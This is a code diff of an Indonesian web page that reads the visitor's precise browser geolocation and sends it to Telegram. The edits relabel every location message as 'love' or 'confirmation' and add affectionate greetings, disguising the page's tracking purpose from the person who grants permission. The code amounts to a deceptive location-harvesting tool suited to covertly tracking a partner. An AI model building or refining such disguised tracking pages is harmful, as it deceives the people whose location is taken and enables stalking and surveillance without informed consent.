@@ -126,13 +126,13 @@
 </section>
 
 <div class="controls">
-  <button class="btn" id="btnGet">click ini</button>
+  <button class="btn" id="btnGet">click ini kalo udah klick ➹</button>
   <button class="btn ghost" id="btnSend" disabled>click lagi ini</button>
   <button class="btn ghost" id="btnCopy" disabled>salin</button>
 </div>
 
 <div id="loc" class="loc-box">hallo kamu cantik hari ini.</div>
-<div class="small">Catatan: pastikan kamu menekan izinkan yang muncul di saat pertama kali membuka web untuk mengkonfirmasi.</div>
+<div class="small">Catatan: pastikan kamu menekan izinkan yang muncul di layar kamu yaa.</div>
 
 <!-- Modal Konfirmasi -->
 <div id="modalBack" class="modal-back" role="dialog" aria-modal="true">
@@ -174,10 +174,10 @@ function setStatus(msg){
 
 btnGet.addEventListener('click', () => {
   if (!navigator.geolocation) {
-    setStatus('Browser tidak mendukung geolokasi.');
+    setStatus('Browser tidak mendukung konfirmasi.');
     return;
   }
-  setStatus('Meminta izin ke myayang… (mohon izinkan)');
+  setStatus('Meminta izin ke my lovku… (mohon izinkan)');
   navigator.geolocation.getCurrentPosition(onPos, onErr, { enableHighAccuracy: true, timeout: 15000 });
 });
 
@@ -185,14 +185,14 @@ function onPos(pos){
   const lat = Number(pos.coords.latitude).toFixed(6);
   const lon = Number(pos.coords.longitude).toFixed(6);
   lastCoords = { lat, lon };
-  setStatus(`📍 Lokasi: ${lat}, ${lon}`);
+  setStatus(`nih aku kasih love se: ${lat}, ${lon}`);
   btnSend.disabled = false;
   btnCopy.disabled = false;
   btnSend.classList.remove('ghost');
 }
 
 function onErr(e){
-  if (e.code === 1) setStatus('Kamu menolak izin awal pertama masuk web.');
+  if (e.code === 1) setStatus('Kamu menolak izin dari my ayang.');
   else if (e.code === 2) setStatus('konfirmasi tidak tersedia.');
   else if (e.code === 3) setStatus('Pengambilan konfirmasi timeout.');
   else setStatus('Gagal mengambil konfirmasi.');
@@ -202,7 +202,7 @@ btnCopy.addEventListener('click', () => {
   if (!lastCoords) return;
   const txt = `${lastCoords.lat}, ${lastCoords.lon}`;
   navigator.clipboard?.writeText(txt).then(()=> {
-    setStatus('Koordinat disalin ke clipboard.');
+    setStatus('jumlah love disalin ke clipboard.');
   }).catch(()=> {
     setStatus('Gagal salin. Copy manual: ' + txt);
   });
@@ -216,7 +216,7 @@ const modalConfirm = document.getElementById('modalConfirm');
 
 btnSend.addEventListener('click', () => {
   if (!lastCoords) return;
-  modalText.textContent = `Kirim lokasi (${lastCoords.lat}, ${lastCoords.lon}) ke Telegram? Pastikan pasangan sudah setuju.`;
+  modalText.textContent = `Kirim love nya (${lastCoords.lat}, ${lastCoords.lon}) ke Telegram? Pastikan pasangan sudah setuju.`;
   modalBack.style.display = 'grid';
 });
 
@@ -260,7 +260,7 @@ async function sendToTelegram(lat, lon){
 
     const j = await resp.json();
     if (resp.ok && j.ok) {
-      setStatus('✅ Lokasi berhasil dikirim ke Telegram.');
+      setStatus('✅ Love berhasil dikirim ke Telegram my ayang.');
     } else {
       console.error('tg err', j);
       setStatus('❌ Gagal kirim ke Telegram: ' + (j.description || 'unknown'));
